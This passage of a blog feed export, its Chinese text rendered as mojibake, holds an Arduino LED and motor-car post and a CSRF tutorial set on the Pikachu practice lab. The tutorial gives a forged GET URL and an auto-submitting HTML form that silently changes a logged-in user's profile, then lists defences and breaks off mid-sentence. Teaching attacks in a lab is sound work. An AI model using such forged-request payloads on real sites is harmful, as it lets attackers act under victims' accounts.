class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">8</span>; i &lt;= <span class="number">13</span>; i++)</span><br><span class="line">  <span class="built_in">pinMode</span>(i, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> interval = <span class="number">100</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ™ºèƒ½å°è½¦ğŸš—"><a href="#æ™ºèƒ½å°è½¦ğŸš—" class="headerlink" title="æ™ºèƒ½å°è½¦ğŸš—"></a>æ™ºèƒ½å°è½¦ğŸš—</h1><p>ä»¥å‰åšè¿‡çš„å°è½¦æ˜¯é©¬è¾¾åŠ ä¸Šè½®å­å°±èƒ½è·‘äº†ï¼Œä¸è¿‡åªèƒ½æ˜¯ä»¥æœ€å¤§é€Ÿåº¦ç›´è¡Œã€‚å¯æœ‰äº†unoæ¿åå°±å®Œå…¨ä¸ä¸€æ ·äº†ï¼Œå®ƒå¯æ˜¯æœ‰å¼ºå¤§çš„CPUåœ¨èº«ï¼Œèƒ½å®ç°è½¬å‘ã€å˜é€Ÿã€æ§åˆ¶ã€å¾ªè¿¹ç­‰ç­‰æ›´åŠ æ™ºèƒ½çš„æ“ä½œã€‚å› ä¸ºæ²¡æœ‰ç›¸åº”æ§åˆ¶æ¨¡å—ï¼Œè¿™æ¬¡çš„ç›®æ ‡æ˜¯è®©å°è½¦å‰åå·¦å³è·‘èµ·æ¥å°±è¡Œäº†ã€‚å¯æƒœæ²¡èƒ½æˆåŠŸï¼Œå¤ªå¤±è´¥äº†å§ã€‚ä»¥ä¸‹æ˜¯æœ€ç®€é™‹çš„å°è½¦ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328170432868.png" alt="image-20210328170432868"></p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="comment">//å®šä¹‰äº”ä¸­è¿åŠ¨çŠ¶æ€</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STOP      0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FORWARD   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKWARD  2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNLEFT  3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNRIGHT 4</span></span><br><span class="line"><span class="comment">//å®šä¹‰éœ€è¦ç”¨åˆ°çš„å¼•è„š</span></span><br><span class="line"><span class="keyword">int</span> leftMotor1 = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> leftMotor2 = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor1 = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor2 = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">  <span class="comment">//è®¾ç½®æ§åˆ¶ç”µæœºçš„å¼•è„šä¸ºè¾“å‡ºçŠ¶æ€</span></span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="keyword">int</span> cmd;</span><br><span class="line">  <span class="keyword">for</span>(cmd=<span class="number">0</span>;cmd&lt;<span class="number">5</span>;cmd++)<span class="comment">//ä¾æ¬¡æ‰§è¡Œå‘å‰ã€å‘åã€å‘å·¦ã€æƒ³æœ‰ã€åœæ­¢å››ä¸ªè¿åŠ¨çŠ¶æ€</span></span><br><span class="line">  &#123;</span><br><span class="line">    motorRun(cmd);  </span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//æ¯ä¸ªå‘½ä»¤æ‰§è¡Œ2s </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿åŠ¨æ§åˆ¶å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">motorRun</span><span class="params">(<span class="keyword">int</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">    <span class="keyword">case</span> FORWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> BACKWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNLEFT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNRIGHT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p>ç»è¿‡æˆ‘ç²—æµ…çš„åˆ†æï¼Œå°è½¦çš„ä»£ç å’Œè¿æ¥åº”è¯¥æ²¡æœ‰é—®é¢˜ï¼Œé—®è¿‡å­¦é•¿åè®¤ä¸ºå¯èƒ½æ˜¯é‚£ä¸ªç”µæœºçš„é—®é¢˜ï¼ˆæ¯•ç«Ÿæ”¾äº†å‡ å¹´ï¼Œæ”¾åäº†ï¼Ÿï¼‰</p><p>ç­‰è¿‡å‡ å¤©ä¹°çš„æ–°å¥—ä»¶åˆ°äº†å†æˆ˜ï¼Œè¿™æ¬¡å°±è¿™ä¹ˆå‘Šä¸€æ®µè½äº†ã€‚è½¦è¿˜æ²¡åŠ¨èµ·æ¥ï¼Œå°±ç¿»è½¦äº†ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚</p></div>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRFâ€œè‹é†’çš„å·¨äººâ€</title>
      <link href="posts/33839.html"/>
      <url>posts/33839.html</url>
      
        <content type="html"><![CDATA[<h1 id="å°åœºé¢"><a href="#å°åœºé¢" class="headerlink" title="å°åœºé¢"></a>å°åœºé¢</h1><ol><li>åœºæ™¯ä¸€ï¼šæˆ‘ç‚¹å‡»äº†ä¸€ä¸ªå¥½å‹è½¬å‘çš„qqç©ºé—´æ¶ˆæ¯ï¼Œæ€ä¹ˆè«åå…¶å¦™è‡ªå·±ä¹Ÿè½¬å‘äº†ï¼Ÿï¼Ÿï¼Ÿ</li><li>åœºæ™¯äºŒï¼šæˆ‘ç‚¹å‡»äº†ä¸€ä¸ªä¸å¯æè¿°çš„ç½‘é¡µï¼Œç„¶åè‡ªå·±çš„è´¦å·åšäº†ä¸€äº›ä¸å¯æè¿°çš„æ“ä½œï¼Ÿï¼Ÿï¼Ÿ</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lengjing.jpg"></p><h1 id="CSRFç®€ä»‹"><a href="#CSRFç®€ä»‹" class="headerlink" title="CSRFç®€ä»‹"></a>CSRFç®€ä»‹</h1><p>ä¸Šé¢ä¸¤ä¸ªåœºé¢å…¶å®å°±æ˜¯åˆ©ç”¨äº† CSRFï¼ˆCross Site Request Forgeryï¼‰ï¼Œå³è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚æ”»å‡»è€…åœ¨ç”¨æˆ·å·²ç»ç™»å½•ç›®æ ‡ç½‘ç«™ä¹‹åï¼Œè¯±ä½¿ç”¨æˆ·è®¿é—®ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œåˆ©ç”¨ç›®æ ‡ç½‘ç«™å¯¹ç”¨æˆ·çš„ä¿¡ä»»ï¼Œä»¥ç”¨æˆ·èº«ä»½åœ¨æ”»å‡»é¡µé¢å¯¹ç›®æ ‡ç½‘ç«™å‘èµ·ä¼ªé€ ç”¨æˆ·æ“ä½œçš„è¯·æ±‚ï¼Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚å¯ä»¥è¿™ä¹ˆç†è§£ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰è¿›è¡ŒæŸäº›ä¸å¯æè¿°çš„æ“ä½œã€‚</p><p>æƒ³è±¡ä¸€ä¸‹ï¼Œå®ƒå¯ä»¥ä»¥ä½ çš„åä¹‰å‘é‚®ä»¶ã€å‘æ¶ˆæ¯ã€è½¬è´¦ã€ä¿®æ”¹å¯†ç ã€åˆ é™¤æ–‡ç« /ç•™è¨€/è¯„è®ºâ€¦â€¦.å±å®å¯æ¶ï¼</p><p>CSRF ä¸ XSS ç›¸æ¯”ï¼Œè™½ç„¶ CSRF æ”»å‡»ä¸å¤ªæµè¡Œï¼Œä½†å´æ›´åŠ éš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥è¢«è®¤ä¸º CSRF æ¯” XSS æ›´å…·å±é™©æ€§ï¼ŒCSRF åœ¨ä¸šå†…å…·æœ‰â€œè‹é†’çš„å·¨äººâ€çš„ç§°å·ã€‚</p><h1 id="CSRFåŸç†"><a href="#CSRFåŸç†" class="headerlink" title="CSRFåŸç†"></a>CSRFåŸç†</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/20171009075751481.png"></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·å®Œæˆä»¥ä¸‹ä¸¤ä¸ªæ“ä½œï¼Œå°±æœ‰å¯èƒ½é­å—CSRFæ”»å‡»ã€‚</p><ol><li>ç™»å½•ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚</li><li>åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</li></ol><h1 id="CSRFæµ‹è¯•"><a href="#CSRFæµ‹è¯•" class="headerlink" title="CSRFæµ‹è¯•"></a>CSRFæµ‹è¯•</h1><blockquote><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachuæ¼æ´ç»ƒä¹ å¹³å°</a>ä¹‹CSRF</p></blockquote><h2 id="GETæ–¹å¼"><a href="#GETæ–¹å¼" class="headerlink" title="GETæ–¹å¼"></a>GETæ–¹å¼</h2><p>â€‹    â‘  ç”¨æˆ·ç”²ç™»å½•ä¿¡ä»»ç½‘ç«™ï¼ŒæŸ¥çœ‹ä¸ªäººä¿¡æ¯ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323205127914.png" alt="image-20210323205127914"></p><p>â€‹    â‘¡ æ”»å‡»è€…æ„é€ æ¶æ„çš„é“¾æ¥ï¼Œå¹¶å°†å…¶å‘é€ç»™ç”¨æˆ·ç”²ã€‚</p><p>é€šè¿‡æŠ“åŒ…å¯è§ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯åæäº¤çš„è¯·æ±‚æ–¹æ³•æ˜¯GETã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323211923048.png" alt="image-20210323211923048"></p><p>URLé‡Œé¢çš„å››ä¸ªå‚æ•°éƒ½å¯ä»¥è¢«ä¿®æ”¹ï¼Œç›´æ¥æ„é€ URLä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.66&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;x&amp;phonenum&#x3D;000000&amp;add&#x3D;Mars&amp;email&#x3D;123@123.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure><p>â€‹    â‘¢ æ”»å‡»è€…é€šè¿‡ç¤¾å·¥ç­‰æ‰‹æ®µå¼•è¯±ç”¨æˆ·ç”²ç‚¹å‡»è¿™ä¸ªé“¾æ¥ã€‚å¦‚æœç”¨æˆ·ç”²æ­¤æ—¶ç™»å½•çŠ¶æ€æˆ–cookie/sessionæ²¡æœ‰è¿‡æœŸï¼Œåˆ™ä»–çš„ä¿¡æ¯å°±è¢«ä¿®æ”¹äº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323212754122.png" alt="image-20210323212754122"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸ªäººä¿¡æ¯å†…å®¹æŒ‰ç…§æ¶æ„é“¾æ¥çš„è®¾ç½®è¢«ä¿®æ”¹äº†ï¼Œè€Œç”¨æˆ·ç”²ä»…ç‚¹å‡»äº†é‚£ä¸ªä¸æ˜é“¾æ¥ã€‚</p><h2 id="POSTæ–¹å¼"><a href="#POSTæ–¹å¼" class="headerlink" title="POSTæ–¹å¼"></a>POSTæ–¹å¼</h2><p>â€‹    â‘  åŒæ ·ï¼Œç”¨æˆ·ä¹™ç™»å½•äº†ä»–ä¿¡ä»»çš„ç½‘ç«™ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213429091.png" alt="image-20210323213429091"></p><p>â€‹    â‘¡ æ”»å‡»è€…æ„é€ æ¶æ„çš„é“¾æ¥ï¼Œå¹¶å°†å…¶å‘é€ç»™ç”¨æˆ·ä¹™ã€‚</p><p>æŠ“åŒ…å¯è§è¿™æ¬¡çš„è¯·æ±‚æ–¹å¼æ˜¯POSTï¼ŒURLä¸å†æ˜¾ç¤ºä¿®æ”¹å‚æ•°ï¼Œæ‰€ä»¥æ— æ³•å†ä½¿ç”¨ä¸Šè¿°åŠæ³•ï¼ˆå³é€šè¿‡URLæ¥ä¼ªé€ è¯·æ±‚ï¼‰è¿›è¡Œä¿®æ”¹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213939444.png" alt="image-20210323213939444"></p><p>ä½†å¯ä»¥è‡ªè¡Œåˆ›å»ºä¸€ä¸ªæ¶æ„è¡¨å•ï¼Œè®©ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªè¡¨å•çš„URLï¼Œé€šè¿‡æ­¤è¡¨å•å‘å­˜åœ¨CSRFæ¼æ´çš„é¡µé¢å»æäº¤POSTè¯·æ±‚ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf_post<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    â‘¢ ç”¨æˆ·ä¹™ç‚¹å‡»äº†è¿™ä¸ªæ¶æ„è¡¨å•çš„é“¾æ¥åï¼Œå…¶ä¸ªäººä¿¡æ¯è¢«ä¿®æ”¹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323215151210.png" alt="image-20210323215151210"></p><h1 id="CSRFé˜²å¾¡"><a href="#CSRFé˜²å¾¡" class="headerlink" title="CSRFé˜²å¾¡"></a>CSRFé˜²å¾¡</h1><p>â€‹    â‘  å°½é‡ä½¿ç”¨POST</p><p>GETæ¥å£å¤ªå®¹æ˜“è¢«æ‹¿æ¥åšCSRFæ”»å‡»ï¼Œæ¥å£æœ€å¥½é™åˆ¶ä¸ºPOSTä½¿ç”¨ï¼Œé™ä½æ”»å‡»é£é™©ã€‚</p><p>å½“ç„¶POSTå¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±ï¼Œæ”»å‡»è€…åªè¦æ„é€ ä¸€ä¸ªformå°±å¯ä»¥ï¼Œä½†éœ€è¦åœ¨ç¬¬ä¸‰æ–¹é¡µé¢åšï¼Œè¿™æ ·å°±å¢åŠ æš´éœ²çš„å¯èƒ½æ€§ã€‚</p><p>â€‹    â‘¡ äºŒæ¬¡éªŒè¯</p><p>åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç èƒ½å¾ˆå¥½éåˆ¶CSRFæ”»å‡»ã€‚å½“ç”¨æˆ·æ”¶åˆ°éªŒè¯ç æç¤ºåï¼Œå¯èƒ½ä¼šå¿ƒå­˜æ€€ç–‘ï¼Œå°±ä¸ä¼šä¹–ä¹–ä¸­æ‹›ã€‚ä½†æ˜¯å‡ºäºç”¨æˆ·ä½“éªŒè€ƒè™‘ï¼Œç½‘ç«™ä¸èƒ½ç»™æ‰€æœ‰çš„æ“ä½œéƒ½åŠ ä¸ŠéªŒè¯ç ã€‚</p><p>â€‹    â‘¢ Referer Check</p><p>Referer Checkåœ¨Webæœ€å¸¸è§çš„åº”ç”¨å°±æ˜¯â€œé˜²æ­¢å›¾ç‰‡ç›—é“¾â€ã€‚åŒç†ï¼ŒReferer Checkä¹Ÿå¯ä»¥è¢«ç”¨äºæ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„â€œæºâ€ï¼ˆRefererå€¼æ˜¯å¦æ˜¯æŒ‡å®šé¡µé¢ï¼Œæˆ–è€…ç½‘ç«™çš„åŸŸï¼‰ï¼Œå¦‚æœéƒ½ä¸æ˜¯ï¼Œé‚£ä¹ˆå°±æå¯èƒ½æ˜¯CSRFæ”»å‡»ã€‚</p><p>ä½†æ˜¯å› ä¸ºæœåŠ¡å™¨å¹¶ä¸æ˜¯ä»€ä¹ˆæ—¶å€™éƒ½èƒ½å–åˆ°Refererï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•ä½œä¸ºCSRFé˜²å¾¡çš„ä¸»è¦æ‰‹æ®µã€‚</p><p>â€‹    â‘£ Tokenè®¤è¯</p><p>Token å³æ ‡å¿—ï¼Œè®°å·çš„æ„æ€ï¼Œä¹Ÿå«ä½œä»¤ç‰Œã€‚</p><p>ä¾‹å­ï¼š</p><ol><li>ç”¨æˆ·è®¿é—®æŸä¸ªè¡¨å•é¡µé¢ã€‚</li><li>æœåŠ¡ç«¯ç”Ÿæˆä¸€ä¸ªTokenï¼Œæ”¾åœ¨ç”¨æˆ·çš„Sessionä¸­ï¼Œæˆ–è€…æµè§ˆå™¨çš„Cookieä¸­ã€‚</li><li>åœ¨é¡µé¢è¡¨å•é™„å¸¦ä¸ŠTokenå‚æ•°ã€‚</li><li>ç”¨æˆ·æäº¤è¯·æ±‚åï¼Œ æœåŠ¡ç«¯éªŒè¯è¡¨å•ä¸­çš„Tokenæ˜¯å¦ä¸ç”¨æˆ·Sessionï¼ˆæˆ–Cookiesï¼‰ä¸­çš„Tokenä¸€è‡´ï¼Œä¸€è‡´ä¸ºåˆæ³•è¯·æ±‚ï¼Œä¸æ˜¯åˆ™éæ³•è¯·æ±‚ã€‚</li></ol><p>è¿™ä¸ªTokençš„å€¼å¿…é¡»æ˜¯éšæœºçš„ï¼Œä¸å¯é¢„æµ‹çš„ã€‚ç”±äºTokençš„å­˜åœ¨ï¼Œæ”»å‡»è€…æ— æ³•å†æ„é€ 